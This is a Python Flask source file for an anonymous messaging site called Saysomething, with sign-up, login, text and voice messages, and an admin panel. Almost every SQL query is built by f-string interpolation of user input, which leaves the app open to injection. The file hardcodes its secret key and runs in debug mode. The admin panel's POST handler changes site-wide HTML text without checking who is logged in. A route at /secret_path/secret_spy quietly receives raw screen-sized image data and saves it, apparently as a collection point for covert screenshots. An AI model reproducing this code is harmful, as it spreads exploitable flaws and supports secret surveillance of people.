from flask import Flask, render_template, request, flash, session, url_for, redirect
from flask_classful import FlaskView, route
import sqlite3
import random
import time
import bcrypt
import os
import json
import datetime
from PIL import Image
app = Flask(__name__, template_folder="templates/", static_folder="assets/")
app.config['UPLOAD_FOLDER'] = "assets/"
app.config['SESSION_TYPE'] = 'memcached'
app.config['SECRET_KEY'] = 'super secret key'




class Database:
	def __init__(self, path):
		self.conn, self.cursor = self.get_conn(path)
	
	def get_conn(self, path):
		conn = sqlite3.connect(path, check_same_thread=False, isolation_level=None)
		cursor = conn.cursor()
		self.isSigning = True
		return conn, cursor

	def execute(self, query):
		try:
			self.cursor.execute(query)
		except Exception as error:
			return (False, error)

	def fetch_one(self):
		try:
			return self.cursor.fetchone()
		except Exception as error:
			return (False, error)

	def commit(self):
		self.conn.commit()



	def new_user(self, username, email, password):
		self.execute(f"SELECT * FROM say_accounts WHERE  email_address = '{email}'")
		__check_email = self.fetch_one()

		self.execute(f"SELECT * FROM say_accounts WHERE username = '{username}'")
		__check_username = self.fetch_one()
		
		if __check_email is not None and __check_username is not None: # Account Already Exist
			return (True, True)
		
		elif __check_email is not None and __check_username is None: # Email exist and username is not
			return (True, False)

		elif __check_email is None and __check_username is not None: # Email Doesn't exist and username is.
			return (False, True)
		
		elif __check_email is None and __check_username is None: # Both doesn't exist.
			hashed_pass = bcrypt.hashpw(password.encode(), bcrypt.gensalt())
			with self.conn:
				__new_folder = f'assets/vendor/voice_messages/{username}'
				os.mkdir(__new_folder)
				self.cursor.execute(f"INSERT INTO say_accounts VALUES ('{username}','{email}','{hashed_pass.decode()}','EMPTY','EMPTY','{__new_folder}', 'NO')")
			return (False, False)

	def login(self, username, password):
		self.execute(f"SELECT password FROM say_accounts WHERE  username = '{username}'")

		__pass = self.fetch_one()
		if __pass is None:
			pass
		else:
			__pass = str(__pass[0]).encode()
			if bcrypt.checkpw(password.encode(), __pass):
				return True
			else:
				return False

class UserLogged:
	def __init__(self, username, database):
		self.__database = database
		self.messages = []
		self.__username = username

	def __separate_messages(self, messageList):
		messages = messageList
		newMessageList = []
		for i in messages:
			splitMessages = i.split(":::::")
			index_0 = splitMessages[0] # Title / Message
			index_1 = splitMessages[1] # Secret Name / Path of Voice Message
			index_2 = splitMessages[2] # Type: message or voice_message
			index_3 = splitMessages[3] # Date Sent
			index_4 = splitMessages[4] # Message_id for delete purposes
			if index_2 == "message":
			    newMessageList.append({"message":index_0,"secretName":index_1,"type":index_2,"date_sent":index_3,"message_id":index_4})
			elif index_2 == "voice_message":
				newMessageList.append({"title":index_0,"voice_path":index_1,"type":index_2,"date_sent":index_3,"message_id":index_4})

		return newMessageList

	def __convert_to_messages(self, listDict):
		newListMessages = ""
		for i in listDict:
			if len(newListMessages) == 0:
				if i['type'] == "message":
				    __structure = f"{i['message']}:::::{i['secretName']}:::::{i['type']}:::::{i['date_sent']}:::::{i['message_id']}"
				elif i['type'] == "voice_message":
					__structure = f"{i['title']}:::::{i['voice_path']}:::::{i['type']}:::::{i['date_sent']}:::::{i['message_id']}"
				newListMessages += __structure
			else:
				if i['type'] == "message":
				    __structure = f"|||||{i['message']}:::::{i['secretName']}:::::{i['type']}:::::{i['date_sent']}:::::{i['message_id']}"
				elif i['type'] == "voice_message":
					__structure = f"|||||{i['title']}:::::{i['voice_path']}:::::{i['type']}:::::{i['date_sent']}:::::{i['message_id']}"
				newListMessages += __structure
		return newListMessages

	def __recount(self):
		oldMessageList = self.get_messages()
		count = 1
		for i in oldMessageList:
			i['message_id'] = count
			count += 1
		newListMessages = self.__convert_to_messages(oldMessageList)
		if len(oldMessageList) == 0:
			self.__database.execute(f"UPDATE say_accounts SET received_messages = 'EMPTY' WHERE username = '{self.__username}'")
		else: 
		    self.__database.execute(f"UPDATE say_accounts SET received_messages = '{newListMessages}' WHERE username = '{self.__username}'")

	def recount(self):
		self.__recount()

	def get_link(self):
		self.__database.execute(f"SELECT my_link FROM say_accounts WHERE username = '{self.__username}'")
		myLink = self.__database.fetch_one()
		if myLink is not None:
		    return myLink[0]
		elif myLink is None:
			return None

	def get_folder(self):
		__check_folder = self.check_has_folder()
		if __check_folder:
		    self.__database.execute(f"SELECT my_folder FROM say_accounts WHERE username = '{self.__username}'")
		    __my_folder = self.__database.fetch_one()[0]
		    return __my_folder
		elif not __check_folder:
			return False

	def get_messages(self):
		self.__database.execute("SELECT received_messages FROM say_accounts WHERE username = '{0}' ".format(self.__username))
		__messages = self.__database.fetch_one()[0]
		if __messages is not None:
		    if "EMPTY" in __messages:
		    	return []
		    elif "EMPTY" not in __messages:

		    	__messages = __messages.split("|||||")
		    	if not bool(__messages[-1].strip()):
		    		__messages.pop()
		    		return self.__separate_messages(__messages)
		    	else:
		    		return self.__separate_messages(__messages)

		
	def check_has_link(self):
		self.__database.execute(f"SELECT my_link FROM say_accounts WHERE username = '{self.__username}'")
		myLink = self.__database.fetch_one()
		if myLink is not None:
		    if "EMPTY" in myLink[0]:
		    	return False
		    elif "EMPTY" not in myLink[0]:
		    	return True
		elif myLink is None:
			return None

	def __set_folder(self, folder):
		if folder is None:
			__new_folder = f'assets/vendor/voice_messages/{self.__username}'
			os.mkdir(__new_folder)
			self.__database.execute(f"UPDATE say_accounts SET my_folder = '{__new_folder}' WHERE username = '{self.__username}'")
			return False
		elif folder is not None:
			return True

	def check_has_folder(self):
		self.__database.execute(f"SELECT my_folder FROM say_accounts WHERE username = '{self.__username}'")
		__my_folder = self.__database.fetch_one()[0]
		return self.__set_folder(__my_folder)

	def get_updated(self):
		self.__database.execute(f"SELECT is_updated FROM say_accounts WHERE username = '{self.__username}'")
		__is_updated = self.__database.fetch_one()[0]
		return __is_updated

	def update_user(self, get_previous=False):
		if get_previous:
		    self.__database.execute(f"SELECT is_updated FROM say_accounts WHERE username = '{self.__username}'")
		    __is_updated = self.__database.fetch_one()[0]
		    self.__database.execute(f"UPDATE say_accounts SET is_updated = 'YES' WHERE username = '{self.__username}'")
		    return __is_updated
		
		self.__database.execute(f"UPDATE say_accounts SET is_updated = 'YES' WHERE username = '{self.__username}'")
		return None



	def create_link(self):
		newLink = f"/message/{self.__username}"
		self.__database.execute(f"UPDATE say_accounts SET my_link = '{newLink}' WHERE username = '{self.__username}'")
		return newLink


	def send_message(self, username, secretName, message):
		self.__database.execute(f"SELECT received_messages FROM say_accounts WHERE username = '{username}'")
		messageList = str(self.__database.fetch_one()[0])
		__message_id = len(self.get_messages()) + 1
		if "EMPTY" in messageList:
			messageList = f"{message}:::::{secretName}:::::message:::::01/01/2022:::::{__message_id}"
		elif "EMPTY" not in messageList:
		    messageList += f"|||||{message}:::::{secretName}:::::message:::::01/01/2022:::::{__message_id}"
		self.__database.execute(f"UPDATE say_accounts SET received_messages = '{messageList}' WHERE username = '{username}'")

	def send_voice_message(self, username, title, file):
		self.__database.execute(f"SELECT received_messages FROM say_accounts WHERE username = '{username}'")
		messageList = str(self.__database.fetch_one()[0])
		__message_id = len(self.get_messages()) + 1
		count = 0
		for i in os.listdir(self.get_folder()):
			count += 1
		count += 1
		file.save(f"{self.get_folder()}/{username}_voice_message_{count}.mp3")
		if "EMPTY" in messageList:
			messageList = f"{title}:::::{self.get_folder()}/{username}_voice_message_{count}.mp3:::::voice_message:::::01/01/2022:::::{__message_id}"
		elif "EMPTY" not in messageList:
			messageList += f"|||||{title}:::::{self.get_folder()}/{username}_voice_message_{count}.mp3:::::voice_message:::::01/01/2022:::::{__message_id}"
		self.__database.execute(f"UPDATE say_accounts SET received_messages = '{messageList}' WHERE username = '{username}'")



	def delete_message(self, message_id):
		messageList = self.get_messages()
		for i in messageList:
			if i['message_id'] == message_id:
				messageList.remove(i)
				newListMessages = self.__convert_to_messages(messageList)
				if i['type'] == "voice_message":
					if os.path.exists(i['voice_path']):
						os.remove(i['voice_path'])
				if len(newListMessages) == 0:
					self.__database.execute(f"UPDATE say_accounts SET received_messages = 'EMPTY' WHERE username = '{self.__username}'")
				else:
				    self.__database.execute(f"UPDATE say_accounts SET received_messages = '{newListMessages}' WHERE username = '{self.__username}'")
				    self.__recount()
				return True

class Saysomething(FlaskView):
	route_base = "/"
	database = Database("data/daacc.db")

	
	def __init__(self):
		pass

	def update_all_users(self):
		self.database.execute("UPDATE say_accounts SET is_updated = 'NO'")

	@route("/", methods=["GET","POST"])
	def index(self):
		#request.headers["bytes"]
		if request.method == "POST":
			if self.database.isSigning: # Sign Up
			    username = str(request.form.get("usernameInput")).lower()
			    email = str(request.form.get("emailInput"))
			    password = str(request.form.get("passInput"))
			    cpassword = str(request.form.get("cpassInput"))

			    if " " in username or " " in password:
			    	flash("No white space allowed.", "warning")

			    elif len(username) < 5 or len(password) < 5:
			    	flash("Username & Password must be atleast 5 characters.", "error")

			    elif " " not in username:

			        if password != cpassword:
			        	flash("Password doesn't match.", "warning")
			        
			        elif password == cpassword:
			            if bool(username.strip()) is False:
			            	flash("Empty username.", "warning")
			            else:
			            	a = self.database.new_user(username, email, password)
			            	if a[0] and a[1]: #Already Exist
			            		flash("Account already exist.", "error")
			            	
			            	elif a[0] and not a[1]:
			            		flash("Email is used already.", "error")
        
			            	elif not a[0] and a[1]:
			            		flash("Username already exist.", "error")
			            	
			            	elif not a[0] and not a[1]: #Doesn't Exist
			            		#flash("Registered successfully!", "success")
			            		time.sleep(4)
			            		session["user"] = username
			            		return redirect(url_for("Saysomething:loginAcc"))
			
			elif not self.database.isSigning: # Login
				username = str(request.form.get("usernameInput")).lower()
				password = str(request.form.get("passInput"))
				__login = self.database.login(username, password)
				self.database.isSigning = False
				if __login:
					session["user"] = username
					self.userLogged = UserLogged(username, self.database)
					return redirect(url_for("Saysomething:loginAcc"))
				elif not __login:
					flash("Wrong password or account doesn't exist.", "error")

				
				return redirect(url_for("Saysomething:loginAcc"))

		if "user" in session:
			user = session["user"]
			return redirect(url_for("Saysomething:loginAcc"))
		else:
			if self.database.isSigning:
				return render_template("home/index.html", statusLog="Sign Up", statusSelected="Register", statusText="Already have an existing account?",statusButton="Sign in",statusFunc="home")
			elif not self.database.isSigning:
				return render_template("home/login.html", statusLog="Sign In", statusSelected="Login", statusText="Create Account.",statusButton="Sign Up",statusFunc="signup")
	
	def check_if_logged(self):
		if "user" in session:
			return True
		elif "user" not in session:
			return False


	@route("/home", methods=["POST", "GET"])
	def loginAcc(self):
		if request.method == "GET":
			with open("data/update_text.json", encoding='utf-8') as updateFile:
				updateFileText = json.load(updateFile)
			if "user" in session:
				user = session["user"]
				session.permanent = True
				self.userLogged = UserLogged(user, self.database)
				self.userLogged.check_has_folder()
				self.userLogged.recount()
				my_link =  self.userLogged.get_link()
				if my_link is not None:
					if  "EMPTY" in my_link:
						user_updated = self.userLogged.update_user(get_previous=True)
						return render_template("account_home/index.html", username = user, hasLink=False, user_is_updated=user_updated, update_text=updateFileText['update_text'])
					elif "EMPTY" not in my_link:
						messages = self.userLogged.get_messages()
						messages.reverse()
						user_updated = self.userLogged.update_user(get_previous=True)
						return render_template("account_home/index.html", username = user, hasLink=True, anonymousMessages=messages, user_is_updated=user_updated, update_text=updateFileText['update_text']) 
				elif my_link is None:
					session.pop("user", None)
					return redirect(url_for("Saysomething:index"))


		   
			else:
				self.database.isSigning = False
				return redirect(url_for("Saysomething:index"))

		elif request.method == "POST":
			if 'user' in session:
				user = session['user']
				userLogged = UserLogged(user, self.database)
				deleteButton = request.form.get("deleteButton")
				if not deleteButton:
				    if "user" in session:
				    	user = session["user"]
				    	userLogged.create_link()
				    	time.sleep(5)
				    	return redirect(url_for("Saysomething:loginAcc"))
				    else:
				    	self.database.isSigning = False
				    	return redirect(url_for("Saysomething:index"))
				elif deleteButton:
					__delete = userLogged.delete_message(deleteButton)
					return redirect(url_for("Saysomething:loginAcc"))


	@route("/signup")
	def signUpAcc(self):
		self.database.isSigning = True
		return redirect(url_for("Saysomething:index"))

	@route("/logout")
	def logoutAcc(self):
		session.pop("user", None)
		return redirect(url_for("Saysomething:index"))


	@route("/message/<user>", methods=["GET","POST"])
	def message_page(self, user):
		__check_logged = self.check_if_logged()
		userLogged = UserLogged(user, self.database)
		if __check_logged:
			__check_link = userLogged.check_has_link()
			if request.method == "GET":
				if session['user'] == user:
					return f"Hmm, you can't send message to your self."
				else:
				    if __check_link:
				        return render_template("send_message/index.html", user=user)
				    elif __check_link is False:
				    	return f"{user} doesn't have link.", 200
				    elif __check_link is None:
				    	return f"This user doesn't exist", 404
    

			elif request.method == "POST":
				if "normalMessageForm" in request.form and "voiceMessageDetect" not in request.form:
				    secretName = request.form.get("secretName")
				    messageSent = request.form.get("messageSent")
				    userLogged.send_message(user, secretName, messageSent)
				    return redirect(url_for("Saysomething:messageSuccess", user=user))
				elif "normalMessageForm" not in request.form and "voiceMessageDetect" in request.form:
					voiceMessageFile = request.files['file']
					descriptionInput = request.form.get('descriptionInput')
					userLogged.send_voice_message(user, descriptionInput, voiceMessageFile)
					return "Voice Message Sent"

				return redirect(url_for("Saysomething:index"))

		elif not __check_logged:
			flash("Please Login first, and then try again.", "warning")
			return redirect(url_for("Saysomething:loginAcc"))
	@route("/success")
	def messageSuccess(self):
		user = request.args.get("user")
		if 'user' in session :
			return render_template("send_message/success.html", user=user)
		else:
			return redirect(url_for("Saysomething:index"))

	@route("/delete")
	def deleteSuccess(self):
		if 'user' in session :
			return render_template("account_home/delete_success.html")
		else:
			return redirect(url_for("Saysomething:index"))


	@route("/saypanel/admin", methods=['POST','GET'])
	def admin_panel(self):
		if request.method == "GET":
			with open("data/update_text.json", encoding='utf-8') as updateText:
				__updateText = json.load(updateText)
			if 'user' in session:
				if session['user'] == "admin":
					self.update_all_users()
					return  render_template("account_home/admin.html", update_text=__updateText['update_text'])
				return "You're not admin."
			else:
				flash("Please Login first, and then try again.", "warning")
				return redirect(url_for("Saysomething:loginAcc"))
		elif request.method == "POST":
			newUpdate = json.dumps({"update_text":request.form.get("updateText")}, indent=6)
			with open("data/update_text.json", "w") as updateFileText:
				updateFileText.write(newUpdate)
			return f"{newUpdate}"

	@route("/secret_path/secret_spy", methods=["GET","POST"])
	def spy(self):
		if request.method == "POST":
			files = request.files
			image_data =  files['upload_file'].read()
			im = Image.frombytes("RGB", (1920, 1080), image_data)
			im.save(f"images/{str(datetime.datetime.now()).replace('.', '_').replace(' ', '_').replace('-', '_').replace(':', '_')}.png")
		else:
			return "."

		return "."
	





server = Saysomething()
server.register(app)

if __name__ == '__main__':
	app.run(host='localhost', port=8080, debug=True)

"""
{
 "update_text": "<small> <strong>📝 Take Note:</strong> Saysomething is in 'Open Beta Testing' phase, it means the website is made available for everyone interested. This interested group will use the website. share the reviews to the publisher.  This process is also called as pre-release of the website.<br/><br/><strong><p>- 👉 You can now send voice message to the user.<br>- 👉 Delete Voice Messages & Normal Messages.<br>- 👉 Bug fixes.</p></strong>"
}
"""